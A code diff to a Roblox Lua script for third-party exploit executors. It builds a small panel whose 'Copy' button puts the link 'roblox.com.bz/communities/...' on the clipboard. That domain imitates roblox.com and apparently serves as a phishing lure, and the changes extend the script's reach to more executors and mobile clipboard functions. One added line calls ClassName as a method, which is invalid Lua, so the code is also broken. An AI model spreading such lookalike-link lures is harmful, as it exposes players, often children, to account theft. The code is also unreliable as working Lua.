@@ -10,8 +10,16 @@ local CopyButton = Instance.new("TextButton")
 local ButtonCorner = Instance.new("UICorner")
 local CreatorLabel = Instance.new("TextLabel")
 
--- Configure ScreenGui
-ScreenGui.Parent = game:GetService("CoreGui")
+-- Delta Compatibility: Safely find the best UI container
+local targetParent = nil
+if gethui then
+    targetParent = gethui()
+elseif game:GetService("CoreGui"):ClassName == "CoreGui" then
+    targetParent = game:GetService("CoreGui")
+else
+    targetParent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+end
+ScreenGui.Parent = targetParent
 ScreenGui.ResetOnSpawn = false
 
 -- 1. Configure Main Background Frame (Black)
@@ -93,23 +101,24 @@ CopyButton.Font = Enum.Font.SourceSansBold
 ButtonCorner.CornerRadius = UDim.new(0, 6)
 ButtonCorner.Parent = CopyButton
 
--- 8. Creator Credit Text (Small, white, bold at the bottom)
+-- 8. Creator Credit Text
 CreatorLabel.Parent = Frame
 CreatorLabel.BackgroundTransparency = 1
 CreatorLabel.Position = UDim2.new(0, 10, 0, 275)
 CreatorLabel.Size = UDim2.new(1, -20, 0, 30)
 CreatorLabel.Text = "Creator : Jamal567790"
-CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Small white text
+CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255) 
 CreatorLabel.TextSize = 12
-CreatorLabel.Font = Enum.Font.SourceSansBold -- Bold Text
+CreatorLabel.Font = Enum.Font.SourceSansBold 
 CreatorLabel.TextXAlignment = Enum.TextXAlignment.Center
 
--- 9. Clipboard Functionality
+-- 9. Clipboard Functionality (Enhanced for mobile executors)
 local groupLink = "https://roblox.com.bz/communities/4836715480/" 
+local clipFunc = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
 CopyButton.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard(groupLink)
+    if clipFunc then
+        clipFunc(groupLink)
         CopyButton.Text = "Copied!"
         task.wait(2)
         CopyButton.Text = "Copy"
